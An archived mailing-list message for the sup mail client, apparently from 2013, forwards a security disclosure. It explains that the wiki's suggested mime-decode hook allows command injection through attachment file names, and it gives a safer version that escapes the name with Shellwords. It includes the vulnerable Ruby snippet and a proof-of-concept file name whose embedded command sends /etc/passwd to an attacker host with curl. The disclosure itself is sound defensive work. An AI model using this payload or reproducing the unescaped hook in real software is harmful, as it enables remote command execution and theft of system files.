@@ -1,0 +1,137 @@
+<!-- MHonArc v2.6.18 -->
+<!--X-Subject: Fwd: Security issue with suggested configuration of sup -->
+<!--X-From-R13: Unhgr Vbcr <rtNtnhgr.irgfw.pbz> -->
+<!--X-Date: Sun, 18 Aug 2013 11:15:41 &#45;0700 (PDT) -->
+<!--X-Message-Id: 1376849419&#45;sup&#45;8191@qwerzila -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+        "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Fwd: Security issue with suggested configuration of sup</title>
+<link rev="made" href="mailto:eg@gaute.vetsj.com">
+</head>
+<body>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<hr>
+[<a href="msg00039.html">Date Prev</a>][<a href="msg00110.html">Date Next</a>][<a href="msg00039.html">Thread Prev</a>][<a href="msg00270.html">Thread Next</a>][<a href="maillist.html#00382">Date Index</a>][<a href="threads.html#00382">Thread Index</a>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<h1>Fwd: Security issue with suggested configuration of sup</h1>
+<hr>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<ul>
+<li><em>To</em>: sup-talk &lt;<a href="mailto:sup-talk%40rubyforge.org">sup-talk@rubyforge.org</a>&gt;,  sup-devel &lt;<a href="mailto:sup-devel%40rubyforge.org">sup-devel@rubyforge.org</a>&gt;</li>
+<li><em>Subject</em>: Fwd: Security issue with suggested configuration of sup</li>
+<li><em>From</em>: Gaute Hope &lt;<a href="mailto:eg%40gaute.vetsj.com">eg@gaute.vetsj.com</a>&gt;</li>
+<li><em>Date</em>: Sun, 18 Aug 2013 20:14:38 +0200</li>
+<li><em>User-agent</em>: Sup/git</li>
+</ul>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<hr>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<pre>Greetings suppers,
+
+joernchen has pointed out to me that our suggested hook for viewing html
+attachment has a serious security issue. The updated suggestion in [0] (wiki)
+should be safer.
+
+
+Please make sure that you update your mime-decode hook!
+
+
+Best regards, Gaute
+
+
+
+[0] <a  rel="nofollow" href="https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments">https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments</a>
+
+
+
+--- Begin forwarded message from joernchen ---
+From: joernchen &lt;...&gt;
+To: eg &lt;eg@gaute.vetsj.com&gt;
+Date: Sat, 17 Aug 2013 14:14:29 +0200
+Subject: Security issue with suggested configuration of sup
+
+[...]
+
+At [0] the suggested configuration for viewing HTML attachments with
+sup using the mime-decode hook is given as follows:
+
+unless sibling_types.member? &quot;text/plain&quot;
+  case content_type
+  when &quot;text/html&quot;
+    `/usr/bin/w3m -dump -T #{content_type} '#{filename}'`
+  end
+end
+
+This piece of code however is prone to command injection via the file
+name of the attached file. The command injection triggers upon sup
+indexing the mail, so no user interaction is needed.
+
+A better approach would be the following:
+
+require 'shellwords'
+unless sibling_types.member? &quot;text/plain&quot;
+  case content_type
+  when &quot;text/html&quot;
+    `/usr/bin/w3m -dump -T #{content_type} #{Shellwords.escape filename}`
+  end
+end
+
+[...]
+
+A simple PoC would be sending an email with a file attachment named
+like:
+
+'$(cd .. &amp;&amp; cd .. &amp;&amp; cd .. &amp;&amp; cd .. &amp;&amp; cd etc &amp;&amp; curl --data @passwd attacker.org)'.html
+
+to a sup user making use of the suggested decode hook.
+
+[0] <a  rel="nofollow" href="https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments">https://github.com/sup-heliotrope/sup/wiki/Viewing-Attachments</a>
+
+[...]
+</pre>
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<hr>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<ul>
+<li>Prev by Date:
+<strong><a href="msg00039.html">Re: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from thread: load threads for thread-index-mode</a></strong>
+</li>
+<li>Next by Date:
+<strong><a href="msg00110.html">Re: [sup-devel] Gmail source sync back.</a></strong>
+</li>
+<li>Previous by thread:
+<strong><a href="msg00039.html">Re: [sup-devel] sup 0.14: Encoding::UndefinedConversionError from thread: load threads for thread-index-mode</a></strong>
+</li>
+<li>Next by thread:
+<strong><a href="msg00270.html">Release 0.14.1</a></strong>
+</li>
+<li>Index(es):
+<ul>
+<li><a href="maillist.html#00382"><strong>Date</strong></a></li>
+<li><a href="threads.html#00382"><strong>Thread</strong></a></li>
+</ul>
+</li>
+</ul>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</body>
+</html>
